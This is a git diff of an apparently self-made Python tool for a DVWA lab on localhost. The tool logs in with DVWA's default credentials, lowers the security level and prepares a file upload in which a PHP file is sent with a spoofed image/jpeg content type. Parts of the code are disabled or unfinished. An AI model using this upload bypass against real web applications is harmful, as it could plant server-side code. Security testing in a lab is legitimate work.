@@ -1,5 +1,6 @@
 import re
 import requests
+from pathlib import Path
 from bs4 import BeautifulSoup
 
 class FileUpload:
@@ -35,7 +36,6 @@ class FileUpload:
             print("No CSRF token found!")
             return None
     
-    #Fix
     def dvwaLogin(self) -> str:
         """For DVWA only. Login to DVWA and return a session object.
         """
@@ -44,13 +44,12 @@ class FileUpload:
             'password': 'password',
             'Login': 'Login'
         }
-        with requests.Session() as c:
+        with self.session as c:
             r = c.get('http://localhost/dvwa/login.php')
             token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
             payload['user_token'] = token
             c.post('http://localhost/dvwa/login.php', data=payload)
             self.cookies = c.cookies
-        self.session = c
 
     def dvwaChangeSecurity(self, level):
         userToken = self.getCSRFToken()
@@ -72,25 +71,21 @@ class FileUpload:
             return
         print("URL is valid for file upload")
         # Finding the file upload form and extracting the necessary fields
-        dictInput = {}
+        formFields = {}
         inputs = forms[0].find_all('input')
         print(inputs)
         if inputs:
             for i in inputs:
                 if i["type"] == "file":
-                    dictInput[i["name"]] = ""
+                    formFields[i["name"]] = ""
                 elif i["type"] == "submit":
                     pass
                 else:
-                    dictInput[i["name"]] = i["value"]
-        # Crafting the payload
-        payload = {}
-        for key in dictInput:
-            if dictInput[key] != "":
-                payload.update({key: (None, dictInput[key])})
-            else:
-                # Case of file:
-                payload.update({key: ('test.php',open('source/tools/self_made/fileupload/test.php', 'rb'), "image/jpeg")})
+                    formFields[i["name"]] = i["value"]
+        # Uploading valid file first for testing
+        self.craftPayload(formFields, "structure.png")
+        """  # Crafting the payload
+        
         session = requests.Session()
         p = session.post(self.url, files=payload, cookies=self.cookies)
         if p.status_code != 200:
@@ -105,13 +100,24 @@ class FileUpload:
                 for htmlSig in signature:
                     print(htmlSig)
                 print("File uploaded successfully")
-                return
-            
+                return """
+    
+    def craftPayload(self, formFields, filename):
+        filePath = Path(filename).absolute()
+        print(filePath)
+        """ payload = {}
+        for key in formFields:
+            if formFields[key] != "":
+                payload.update({key: (None, formFields[key])})
+            else:
+                # Case of file:
+                payload.update({key: (f'{filename}',open('source/tools/self_made/fileupload/test.php', 'rb'), "image/jpeg")}) """
+        
     def main(self):
-        """ self.dvwaLogin()
-        self.dvwaChangeSecurity("low") """
+        self.dvwaLogin()
+        self.dvwaChangeSecurity("low")
         self.uploadfile()
 
-#a = FileUpload("http://localhost/dvwa/vulnerabilities/upload/")
-a = FileUpload("http://localhost:12001")
+a = FileUpload("http://localhost/dvwa/vulnerabilities/upload/")
+#a = FileUpload("http://localhost:12001")
 a.main()
